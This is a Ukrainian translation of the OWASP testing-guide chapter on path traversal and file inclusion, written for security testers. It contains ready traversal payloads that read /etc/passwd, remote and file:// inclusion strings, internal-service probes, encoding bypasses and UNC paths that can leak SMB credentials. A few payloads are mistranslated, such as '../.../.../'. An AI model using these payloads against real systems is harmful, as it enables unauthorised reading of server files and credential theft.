# Тестування файлу обходу каталогу Include
ІДЕНТИФІКАТОР
WSTG-ATHZ-01

## Короткий опис
Багато веб-додатків використовують файли і керують ними в процесі своєї повсякденної роботи. Використовуючи методи перевірки вхідних даних, які не були належним чином спроектовані або розгорнуті, зловмисник може використати систему для читання або запису файлів, які не призначені для доступу. У певних ситуаціях це може призвести до виконання довільного коду або системних команд.

Традиційно веб-сервери та веб-додатки реалізують механізми автентифікації для контролю доступу до файлів і ресурсів. Веб-сервери намагаються обмежити файли користувачів всередині "кореневого каталогу" або "кореня веб-документа", який представляє собою фізичний каталог у файловій системі. Користувачі повинні розглядати цей каталог як базовий в ієрархічній структурі веб-додатку.

Визначення привілеїв здійснюється за допомогою списків контролю доступу (ACL), які визначають, які користувачі або групи мають право доступу, модифікації або виконання певного файлу на сервері. Ці механізми призначені для запобігання доступу зловмисників до важливих файлів (наприклад, до звичайного файлу ```/etc/passwd``` на UNIX-подібних платформах) або для уникнення виконання системних команд.

Багато веб-додатків використовують скрипти на стороні сервера для включення різних типів файлів. Досить поширеним є використання цього методу для керування зображеннями, шаблонами, завантаження статичних текстів тощо. На жаль, ці додатки мають вразливості в безпеці, якщо вхідні параметри (наприклад, параметри форми, значення файлів cookie) не перевіряються належним чином.

У веб-серверах та веб-додатках подібні проблеми виникають при обході шляху/файл інклюзивних атаках. Використовуючи цей тип уразливості, зловмисник може прочитати каталоги або файли, які він зазвичай не може прочитати, отримати доступ до даних за межами кореня веб-документа, або включити скрипти та інші типи файлів із зовнішніх веб-сайтів.

У цьому посібнику з тестування OWASP розглядаються лише загрози безпеці, пов'язані з веб-додатками, а не загрози для веб-серверів (наприклад, сумнозвісний ескейп-код ```%5c``` у веб-сервері Microsoft IIS). Зацікавлені читачі можуть знайти додаткову літературу в розділі посилань.

Цей тип атаки також відомий як крапка-точка-коса риска (```../```), обхід каталогів, підйом по каталогах або відстеження назад.

Під час оцінювання, щоб виявити обхід шляху та дефекти включення файлів, тестувальники повинні виконати два різних етапи:
- Перерахування вхідних векторів (систематична оцінка кожного вхідного вектора)
- Тестування методів (методична оцінка кожного методу атаки, що використовується зловмисником для використання вразливості)

## Цілі тестування
- Визначити точки ін'єкцій, які відносяться до проходження шляху.
- Оцінити методи обходу та визначити ступінь проходження шляху.

## Як тестувати
### Тестування на чорній скриньці
### Перерахування вхідних векторів

Щоб визначити, яка частина програми вразлива до обходу валідації вводу, тестувальник повинен перерахувати всі частини програми, які приймають вміст від користувача. Це також включає в себе HTTP GET і POST запити і поширені опції, такі як завантаження файлів і HTML-форм.

Ось кілька прикладів перевірок, які потрібно виконати на цьому етапі:
- Чи існують параметри запиту, які можуть бути використані для операцій з файлами?
- Чи є незвичайні розширення файлів?
- Чи є цікаві імена змінних? 
	- ```http://example.com/getUserProfile.jsp?item=ikki.html```
	- ```ttp://example.com/index.php?file=content```
	- ```http://example.com/main.cgi?home=index.htm```
- Чи можна ідентифікувати файли cookie, які використовуються веб-додатком для динамічної генерації сторінок або шаблонів?
	- ```Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower```
	- ```Cookie: USER=1826cc8f:PSTYLE=GreenDotRed```

## Методика тестування
Наступним етапом тестування є аналіз функцій перевірки вхідних даних, присутніх у веб-додатку. У попередньому прикладі динамічна сторінка ```getUserProfile.jsp``` завантажує статичну інформацію з файлу і показує вміст користувачам. Зловмисник може вставити шкідливий рядок ```../.../.../.../etc/passwd```, щоб включити хеш-файл пароля системи Linux/UNIX. Очевидно, що така атака можлива лише за умови збою в контрольній точці валідації; згідно з привілеями файлової системи, сам веб-додаток повинен мати можливість прочитати цей файл.

Для успішного тестування на цю уразливість тестувальник повинен мати знання про систему, що тестується, і розташування файлів, які запитуються. Немає сенсу запитувати ```/etc/passwd``` з веб-сервера IIS.

	http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
На прикладі файлів cookie:
	
	Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
Також можна включити файли і скрипти, розташовані на зовнішньому сайті:

	http://example.com/index.php?file=http://www.owasp.org/malicioustxt
Якщо в якості аргументів приймаються протоколи, як у наведеному вище прикладі, можна також дослідити локальну файлову систему таким чином:

	http://example.com/index.php?file=file:///etc/passwd
Якщо в якості аргументів приймаються протоколи, як у наведених вище прикладах, можна також дослідити локальні сервіси та сусідні сервіси:

	http://example.com/index.php?file=http://localhost:8080
	http://example.com/index.php?file=http://192.168.0.2:9080
Наступний приклад продемонструє, як можна показати вихідний код CGI-компонента, не використовуючи жодних символів обходу шляху.
	
	http://example.com/main.cgi?home=main.cgi	
Компонент з ім'ям ```main.cgi``` знаходиться в тому ж каталозі, що і звичайні статичні файли HTML, які використовуються додатком. У деяких випадках тестувальнику потрібно кодувати запити з використанням спеціальних символів (наприклад, ```•```, ```%00``` нуль і т.д.), щоб обійти контроль розширення файлу або запобігти виконанню скрипта.

**Порада:** Поширеною помилкою розробників є те, що вони не враховують всі види кодування і тому виконують перевірку лише для основного закодованого контенту. Якщо тестовий рядок не пройшов перевірку, спробуйте іншу схему кодування.

Кожна операційна система використовує різні символи як роздільник шляху:

- Unix-подібні ОС:
	- кореневий каталог: ```/```
	- роздільник каталогів: ```/```
- ОС Windows:
	- кореневий каталог: ```<буква диска>:
	- роздільник каталогів: ```\``` або ```/```
- Класична macOS:
	- кореневий каталог: ```<буква диска>:```
	- роздільник каталогів: ```:```

Слід враховувати наступні механізми кодування символів:

- Кодування URL і подвійне кодування URL
	- ```%2e%2e%2f``` представляє ```../```
	- ```%2e%2e/``` представляє ```../```
	- ```..%2f``` означає ```../```
	- ```%2e%2e%5c``` представляє ```..\```
	- ```%2e%2e\``` означає ```..\```
	- ```..%5c``` означає ```..\```
	- ```%252e%252e%255c``` означає ```..\```
	- ```..%255c``` представляє ```..\``` і так далі.
- Кодування Unicode/UTF-8 (працює тільки в системах, які здатні приймати довгі послідовності UTF-8)
	- ```..%c0%af``` означає ```../```
	- ```..%c1%9c``` означає ```..\```

Існують також інші специфічні міркування, пов'язані з операційними системами та фреймворками додатків. Наприклад, Windows має гнучкий підхід до розбору шляхів до файлів.
- Оболонка Windows: Додавання будь-якого з наведених нижче символів до шляху, що використовується у команді оболонки, не призведе до жодних змін у функціях:
	- Кутові дужки ```<``` і ```>``` у кінці шляху
	- Подвійні лапки (закриті належним чином) у кінці шляху
	- Сторонні маркери поточного каталогу, такі як ```./``` або ```.\\.```
	- Сторонні маркери батьківського каталогу з довільними елементами, які можуть існувати, а можуть і не існувати:
		- ```file.txt```
		- ```file.txt...```
		- ```file.txt<spaces>```
		- ```file.txt""""```
		- ```file.txt<<<>>><```
		- ```././././file.txt```
		- ```nonexistant/../file.txt```

- Windows API: Наступні елементи відкидаються при використанні у будь-якій команді оболонки або виклику API, де як ім'я файлу приймається рядок:
	- крапки
	- пробіли

- Шляхи файлів Windows UNC: Використовується для посилання на файли у спільних ресурсах SMB. Іноді програма може звертатися до файлів на віддаленому UNC-шляху. У такому випадку сервер Windows SMB може надіслати зловмиснику збережені облікові дані, які можна перехопити і зламати. Вони також можуть бути використані разом з самопосиланням на IP-адресу або доменне ім'я, щоб обійти фільтри, або для доступу до файлів на спільних ресурсах SMB, недоступних для зловмисника, але доступних з веб-сервера.
	- ```\\server_or_ip\path\to\file.abc```
	- ```\\?\server_or_ip\path\to\file.abc```

- Простір назв пристроїв Windows NT: Використовується для посилання на простір назв пристроїв Windows. Певні посилання дозволять отримати доступ до файлових систем за іншим шляхом.
	- Може бути еквівалентом літери диска, наприклад, ```c:\```, або навіть тому диска без призначеної літери: ```\\.\GLOBALROOT\Device\HarddiskVolume1\```
	- Посилається на перший дисковий накопичувач на комп'ютері: ```\\.\CdRom0\```

## Тестування за методом сірої скриньки
Коли аналіз виконується за допомогою методу сірої скриньки, тестувальники повинні дотримуватися тієї ж методології, що і при тестуванні за допомогою чорної скриньки. Однак, оскільки вони можуть переглядати вихідний код, можна легше і точніше шукати вхідні вектори. Під час перегляду вихідного коду вони можуть використовувати прості інструменти (наприклад, команду grep) для пошуку одного або декількох загальних шаблонів у коді програми: функцій/методів включення, операцій з файловою системою і так далі.
- ```PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...```
- ```JSP/Servlet: java.io.File(), java.io.FileReader(), ...```
- ```ASP: include file, include virtual, ...```

За допомогою онлайн-пошукових систем коду (наприклад, Searchcode) також можна знайти помилки обходу шляхів в програмному забезпеченні з відкритим вихідним кодом, опублікованому в Інтернеті.

Для PHP тестувальники можуть використовувати наступний регекс:
```(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)```

Використовуючи метод тестування сірих скриньок, можна виявити вразливості, які зазвичай складніше виявити або навіть неможливо знайти під час стандартного тестування чорних скриньок.

Деякі веб-додатки генерують динамічні сторінки, використовуючи значення і параметри, що зберігаються в базі даних. Під час додавання даних до бази даних може існувати можливість вставити спеціально створені рядки обходу шляху, коли програма додає дані до бази даних. Цей тип проблеми безпеки важко виявити через те, що параметри всередині функцій включення здаються внутрішніми і **безпечними**, але насправді такими не є.

Крім того, переглядаючи вихідний код, можна проаналізувати функції, які мають обробляти невірне введення: деякі розробники намагаються змінити невірне введення на правильне, уникаючи попереджень і помилок. Такі функції зазвичай схильні до вразливостей у безпеці.

Розглянемо веб-додаток з такими інструкціями:
	
	filename = Request.QueryString("file");
	Replace(filename, "/", "\");
	Replace(filename, "..\","");
Перевірка на наявність дефекту здійснюється за допомогою:

	file=....//....//boot.ini
	file=....\\....\\boot.ini
	file= ..\..\boot.ini

## Інструменти
- DotDotPwn - Fuzzer для обходу каталогів
- Нечіткі рядки для обходу шляхів (від WFuzz Tool) 
- OWASP ZAP
- Burp Suite
- Інструменти кодування/декодування
- Шукач рядків "grep"
- DirBuster

## Посилання
### Довідкові документи
- phpBB Attachment Mod Обхід каталогу HTTP POST Ін'єкція HTTP POST - Ін'єкція
- Псевдоніми файлів Windows: Pwnage та Поезія